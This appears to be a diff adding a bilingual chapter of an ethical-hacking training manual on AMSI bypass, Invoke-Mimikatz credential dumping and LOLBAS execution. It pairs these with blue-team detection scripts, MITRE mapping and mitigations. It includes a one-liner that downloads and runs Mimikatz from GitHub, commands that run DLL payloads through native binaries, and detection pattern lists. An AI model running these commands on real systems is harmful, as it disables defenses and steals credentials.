@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 23 — Técnicas Complementares | Ch. 23</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 23 — Técnicas Complementares</h1>
+<div class="sub">Ch. 23 — AMSI Bypass e LOLBAS Execution</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / Pós-Exploração</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#amsi">AMSI Bypass</a></li><li><a href="#mimikatz">Invoke-Mimikatz</a></li>
+<li><a href="#lolbas">LOLBAS Execution</a></li><li><a href="#impact">Scripts de Impacto</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#mitig">Mitigações</a></li>
+<li><a href="#lab">Laboratório</a></li><li><a href="#revq">Revisão</a></li>
+<li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o AMSI e porque é um obstáculo; executar um bypass AMSI com <code class="inline">shantanukhande-amsi.ps1</code>; usar <code class="inline">Invoke-Mimikatz</code> para dump de credenciais; executar scripts através de binários nativos (cscript, wscript, mshta, rundll32, regsvr32, odbcconf); <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand AMSI and why it's an obstacle; execute an AMSI bypass with <code class="inline">shantanukhande-amsi.ps1</code>; use <code class="inline">Invoke-Mimikatz</code> for credential dumping; execute scripts through native binaries (cscript, wscript, mshta, rundll32, regsvr32, odbcconf); <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O AMSI (Antimalware Scan Interface) é uma funcionalidade do Windows que se coloca entre motores de script (PowerShell, macros do Office) e o antivírus/EDR. Quando um script é executado, o runtime entrega o conteúdo ao AMSI para ser escaneado antes de correr. Isto torna a atividade em memória visível para as ferramentas de segurança. Os hackers tentam constantemente evitar que o conteúdo malicioso chegue ao AMSI, ou alterá-lo para não corresponder às regras de deteção .</span>
+<span class="en">AMSI (Antimalware Scan Interface) is a Windows feature that sits between script engines (PowerShell, Office macros) and the antivirus/EDR. When a script executes, the runtime hands the content to AMSI to be scanned before running. This makes in-memory activity visible to security tools. Hackers constantly try to keep malicious content from reaching AMSI, or change it so it doesn't match detection rules .</span>
+</div>
+</section>
+
+<section id="amsi">
+<h2>3. AMSI Bypass <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O primeiro passo é confirmar que o Windows Defender está ativo. Se estiver desligado, não é necessário bypass e podes avançar diretamente .</span>
+<span class="en">The first step is to confirm that Windows Defender is running. If it's off, no bypass is needed and you can proceed directly .</span>
+</div>
+<pre>PS > Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'"</pre>
+<div class="lang">
+<span class="pt">Com o Defender ativo, executa o script de bypass. O output esperado indica que o AMSI foi patchado com sucesso — a partir daí, o Defender não tem acesso às sessões PowerShell e qualquer script pode ser executado sem restrição .</span>
+<span class="en">With Defender running, execute the bypass script. The expected output indicates AMSI was successfully patched — from then on, Defender has no access to PowerShell sessions and any script can be executed without restriction .</span>
+</div>
+<pre>PS > .\shantanukhande-amsi.ps1</pre>
+<div class="callout danger">
+<strong>⚠️ Nota importante / Important note:</strong>
+<div class="lang">
+<span class="pt">Alguns artigos sugerem que fazer downgrade para PowerShell v2 ajuda a evadir deteção, mas isso <strong>já não é verdade</strong>. O Defender monitoriza ativamente todas as sessões e estes truques simples não funcionam mais .</span>
+<span class="en">Some articles suggest downgrading to PowerShell v2 helps evade detection, but that is <strong>no longer true</strong>. Defender actively monitors all sessions and these simple tricks no longer work .</span>
+</div>
+</div>
+</section>
+
+<section id="mimikatz">
+<h2>4. Invoke-Mimikatz <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Com o AMSI patchado, podes executar o Mimikatz diretamente na sessão. O artigo usa a versão atualizada <code class="inline">Invoke-Mimikatz.ps1</code> de g4uss47. Por razões de OPSEC, não se recomenda correr comandos Mimikatz que toquem outros hosts (podem ser detetados por produtos de segurança de rede). Em vez disso, faz dump local do LSASS .</span>
+<span class="en">With AMSI patched, you can run Mimikatz directly in the session. The article uses the updated <code class="inline">Invoke-Mimikatz.ps1</code> by g4uss47. For OPSEC reasons, running Mimikatz commands that touch other hosts is not recommended (they can be picked up by network security products). Instead, dump LSASS locally .</span>
+</div>
+<pre>PS > iwr http://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1 | iex
+PS > Invoke-Mimikatz -DumpCreds</pre>
+<div class="lang">
+<span class="pt">O resultado são credenciais do utilizador comprometido. Se o alvo for mais valioso (servidor, base de dados), podes esperar credenciais de Domain Admin .</span>
+<span class="en">The result is the compromised user's credentials. If the target is more valuable (server, database), you can expect Domain Admin credentials .</span>
+</div>
+</section>
+
+<section id="lolbas">
+<h2>5. LOLBAS Execution <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O artigo "Survival Edition, Part 4" demonstra como executar scripts sem usar <code class="inline">.ps1</code> diretamente, abusando de binários nativos do Windows (LOLBAS). Estes binários são benignos, nativos, e disponíveis em sistemas legados — e como são tão comuns, geram falsos positivos que drenam os defensores .</span>
+<span class="en">The "Survival Edition, Part 4" article demonstrates how to execute scripts without using <code class="inline">.ps1</code> directly, by abusing native Windows binaries (LOLBAS). These binaries are benign, native, and available on legacy systems — and because they are so common, they generate false positives that drain defenders .</span>
+</div>
+<h3>5.1 cscript.exe</h3>
+<pre>PS > cscript //E:JScript //Nologo C:\Temp\script.js</pre>
+<div class="lang">
+<span class="pt">Executa VBScript ou JScript. <code class="inline">//E:JScript</code> seleciona o motor JavaScript; <code class="inline">//Nologo</code> esconde o cabeçalho. É menos monitorizado que PowerShell em alguns ambientes e parece automação legada .</span>
+<span class="en">Runs VBScript or JScript. <code class="inline">//E:JScript</code> selects the JavaScript engine; <code class="inline">//Nologo</code> hides the header. It's less watched than PowerShell in some environments and looks like legacy automation .</span>
+</div>
+<h3>5.2 wscript.exe</h3>
+<pre>PS > wscript.exe //E:VBScript C:\Temp\enum.vbs //B</pre>
+<div class="lang">
+<span class="pt"><code class="inline">//B</code> corre em modo batch (sem message boxes). O script VBScript é executado pelo Windows Script Host .</span>
+<span class="en"><code class="inline">//B</code> runs in batch mode (no message boxes). The VBScript is executed by Windows Script Host .</span>
+</div>
+<h3>5.3 mshta.exe</h3>
+<pre>PS > mshta users.hta</pre>
+<div class="lang">
+<span class="pt">Executa uma HTML Application com código embebido. Pode criar um objeto WScript e executar comandos. Parece um componente web/UI e contorna algumas regras de script .</span>
+<span class="en">Runs an HTML Application with embedded code. It can create a WScript object and execute commands. It looks like a web/UI component and bypasses some script-only rules .</span>
+</div>
+<h3>5.4 rundll32.exe</h3>
+<pre>C:\> rundll32.exe C:\reflective_dll.x64.dll,TestEntry</pre>
+<div class="lang">
+<span class="pt">Carrega uma DLL e chama a função exportada. É um binário de sistema comum, pelo que a atividade se mistura com passos normais de instalação .</span>
+<span class="en">Loads a DLL and calls the exported function. It's a common system binary, so activity blends into normal installer steps .</span>
+</div>
+<h3>5.5 regsvr32.exe</h3>
+<pre>PS > regsvr32.exe /u /s .\reflective_dll.x64.dll</pre>
+<div class="lang">
+<span class="pt"><code class="inline">/s</code> torna a execução silenciosa. Operações de registo são normais em workflows de IT, pelo que a chamada pode passar despercebida .</span>
+<span class="en"><code class="inline">/s</code> makes execution silent. Registration operations are normal in IT workflows, so the call can be overlooked .</span>
+</div>
+<h3>5.6 odbcconf.exe</h3>
+<pre># Executar DLL gerada via msfvenom
+PS > odbcconf.exe /S /A {REGSVR "C:\Temp\payload.dll"}</pre>
+<div class="lang">
+<span class="pt">Normalmente ajuda programas a ligar-se a bases de dados. Pode ser abusado para executar DLLs .</span>
+<span class="en">Normally helps programs connect to databases. It can be abused to execute DLLs .</span>
+</div>
+</section>
+
+<section id="impact">
+<h2>6. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar as técnicas deste capítulo.</span>
+<span class="en">The scripts below help the blue team detect the techniques in this chapter.</span>
+</div>
+
+<h3>6.1 Script 23.1 — Deteção de AMSI Bypass / AMSI Bypass Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar strings de bypass AMSI em Script Block Logging (4104). <strong>Evidência:</strong> <code class="inline">amsi-bypass-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect AMSI bypass strings in Script Block Logging (4104). <strong>Evidence:</strong> <code class="inline">amsi-bypass-detect.csv</code>.</span>
+</div>
+<pre># Script 23.1 - AMSI Bypass Detection
+$out = ".\amsi-bypass-detect.csv"
+$patterns = @("amsiutils", "AmsiScanBuffer", "amsiInitFailed", "shantanukhande", "amsiContext")
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) {
+      if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] AMSI bypass hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>6.2 Script 23.2 — Deteção de Invoke-Mimikatz / Invoke-Mimikatz Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar strings específicas do Mimikatz (<code class="inline">-DumpCreds</code>, <code class="inline">sekurlsa</code>, <code class="inline">kerberos::golden</code>). <strong>Evidência:</strong> <code class="inline">mimikatz-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect Mimikatz-specific strings (<code class="inline">-DumpCreds</code>, <code class="inline">sekurlsa</code>, <code class="inline">kerberos::golden</code>). <strong>Evidence:</strong> <code class="inline">mimikatz-detect.csv</code>.</span>
+</div>
+<pre># Script 23.2 - Invoke-Mimikatz Detection
+$out = ".\mimikatz-detect.csv"
+$patterns = @("Invoke-Mimikatz", "-DumpCreds", "sekurlsa::pth", "kerberos::ptt", "kerberos::golden")
+$hits = @()
+Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4104 } | ForEach-Object {
+    $msg = $_.Message
+    foreach ($p in $patterns) {
+      if ($msg -match $p) { $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Pattern=$p; Snippet=$msg.Substring(0,[Math]::Min(300,$msg.Length)) } }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Mimikatz hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>6.3 Script 23.3 — Deteção de LOLBAS Execution / LOLBAS Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar execução de cscript, wscript, mshta, rundll32, regsvr32 ou odbcconf com argumentos suspeitos (URLs, caminhos em Temp). <strong>Evidência:</strong> <code class="inline">lolbas-exec-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect cscript, wscript, mshta, rundll32, regsvr32, or odbcconf execution with suspicious arguments (URLs, Temp paths). <strong>Evidence:</strong> <code class="inline">lolbas-exec-detect.csv</code>.</span>
+</div>
+<pre># Script 23.3 - LOLBAS Execution Detection
+$out = ".\lolbas-exec-detect.csv"
+$patterns = @("cscript\.exe", "wscript\.exe", "mshta\.exe", "rundll32\.exe", "regsvr32\.exe", "odbcconf\.exe")
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $proc = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
+    $cmd  = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    foreach ($p in $patterns) {
+      if ($proc -match $p -and ($cmd -match "http" -or $cmd -match "Temp" -or $cmd -match "Public")) {
+        $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Process=$proc; Command=$cmd }
+      }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] LOLBAS execution hits: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+</section>
+
+<section id="mitre">
+<h2>7. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Impair Defenses: Disable or Modify Tools</td><td>T1562.001</td><td>AMSI Bypass </td></tr>
+<tr><td>OS Credential Dumping: LSASS Memory</td><td>T1003.001</td><td>Invoke-Mimikatz </td></tr>
+<tr><td>System Binary Proxy Execution: Mshta</td><td>T1218.005</td><td>mshta.exe </td></tr>
+<tr><td>System Binary Proxy Execution: Rundll32</td><td>T1218.011</td><td>rundll32.exe </td></tr>
+<tr><td>System Binary Proxy Execution: Regsvr32</td><td>T1218.010</td><td>regsvr32.exe </td></tr>
+<tr><td>Command and Scripting Interpreter: Windows Command Shell</td><td>T1059.003</td><td>cscript, wscript </td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>8. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar 4104 para strings AMSI</strong> — Script 23.1.</li>
+<li><strong>Monitorizar Invoke-Mimikatz</strong> — Script 23.2.</li>
+<li><strong>Alertar sobre LOLBAS com URLs ou Temp</strong> — Script 23.3.</li>
+<li><strong>Ativar AMSI e Script Block Logging</strong> — deteta bypass e execução.</li>
+<li><strong>Restringir LOLBAS via AppLocker/WDAC</strong> — bloquear cscript, wscript, mshta se não forem necessários.</li>
+<li><strong>Credential Guard</strong> — protege LSASS contra dump.</li>
+<li><strong>Monitorizar <code class="inline">odbcconf</code> e <code class="inline">regsvr32</code> com DLLs em Temp</strong> — comportamento suspeito.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>9. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows isolada com snapshot e PowerShell logging ativado. Testar AMSI bypass, Invoke-Mimikatz (simulado) e LOLBAS com scripts de teste. Correr os scripts de deteção. <strong>Objetivo:</strong> compreender as técnicas e validar deteções.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows VM with snapshot and PowerShell logging enabled. Test AMSI bypass, Invoke-Mimikatz (simulated), and LOLBAS with test scripts. Run detection scripts. <strong>Goal:</strong> understand the techniques and validate detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Verificar Defender</td><td><code class="inline">Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'"</code></td><td>Output</td></tr>
+<tr><td>2</td><td>AMSI bypass</td><td><code class="inline">.\shantanukhande-amsi.ps1</code></td><td>Output</td></tr>
+<tr><td>3</td><td>Invoke-Mimikatz</td><td><code class="inline">Invoke-Mimikatz -DumpCreds</code></td><td>Hashes</td></tr>
+<tr><td>4</td><td>cscript</td><td><code class="inline">cscript //E:JScript //Nologo test.js</code></td><td>Output</td></tr>
+<tr><td>5</td><td>Deteção AMSI</td><td><code class="inline">.\amsi-detect.ps1</code></td><td><code class="inline">amsi-bypass-detect.csv</code></td></tr>
+<tr><td>6</td><td>Deteção Mimikatz</td><td><code class="inline">.\mimikatz-detect.ps1</code></td><td><code class="inline">mimikatz-detect.csv</code></td></tr>
+<tr><td>7</td><td>Deteção LOLBAS</td><td><code class="inline">.\lolbas-exec-detect.ps1</code></td><td><code class="inline">lolbas-exec-detect.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Output AMSI bypass</li>
+<li>Hashes Mimikatz</li>
+<li>Output cscript</li>
+<li><code class="inline">amsi-bypass-detect.csv</code></li>
+<li><code class="inline">mimikatz-detect.csv</code></li>
+<li><code class="inline">lolbas-exec-detect.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>10. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>O que é o AMSI e porque é um obstáculo para hackers? / What is AMSI and why is it an obstacle for hackers? </li>
+<li>Porque é que o downgrade para PowerShell v2 já não funciona? / Why doesn't downgrading to PowerShell v2 work anymore? </li>
+<li>O que faz o <code class="inline">Invoke-Mimikatz -DumpCreds</code>? / What does <code class="inline">Invoke-Mimikatz -DumpCreds</code> do? </li>
+<li>Qual a vantagem de usar cscript ou wscript em vez de PowerShell? / What's the advantage of using cscript or wscript instead of PowerShell? </li>
+<li>O que faz o <code class="inline">rundll32.exe</code> e porque é abusável? / What does <code class="inline">rundll32.exe</code> do and why is it abusable? </li>
+<li>Como se deteta AMSI bypass no blue team? / How to detect AMSI bypass on the blue team?</li>
+<li>Porque é que o AppLocker/WDAC mitiga LOLBAS? / Why does AppLocker/WDAC mitigate LOLBAS? </li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>11. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo consolidou duas técnicas complementares: <strong>AMSI Bypass</strong> (com <code class="inline">shantanukhande-amsi.ps1</code>) seguido de <strong>Invoke-Mimikatz</strong> para dump de credenciais, e <strong>LOLBAS Execution</strong> (cscript, wscript, mshta, rundll32, regsvr32, odbcconf) para executar scripts sem usar <code class="inline">.ps1</code> diretamente. O AMSI é o principal obstáculo à execução de ferramentas em memória; o bypass permite que o Mimikatz corra sem ser escaneado. Os LOLBAS são binários nativos que se misturam com atividade administrativa e geram falsos positivos, tornando a deteção difícil. Acrescentámos <strong>três scripts de impacto</strong> (deteção de AMSI bypass, Invoke-Mimikatz, LOLBAS execution) que ajudam o blue team a detetar estas técnicas.</span>
+<span class="en">This chapter consolidated two complementary techniques: <strong>AMSI Bypass</strong> (with <code class="inline">shantanukhande-amsi.ps1</code>) followed by <strong>Invoke-Mimikatz</strong> for credential dumping, and <strong>LOLBAS Execution</strong> (cscript, wscript, mshta, rundll32, regsvr32, odbcconf) to run scripts without using <code class="inline">.ps1</code> directly. AMSI is the main obstacle to running in-memory tools; the bypass allows Mimikatz to run unscanned. LOLBAS are native binaries that blend with admin activity and generate false positives, making detection hard. We added <strong>three impact scripts</strong> (AMSI bypass detection, Invoke-Mimikatz, LOLBAS execution) that help the blue team detect these techniques.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 23 / Ethical Hacker Training Manual — Ch. 23</div>
+<div style="margin-top:.6rem">
+<a href="cap22.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="#">Fim / End →</a>
+</div>
+</footer>
+</body>
+</html>
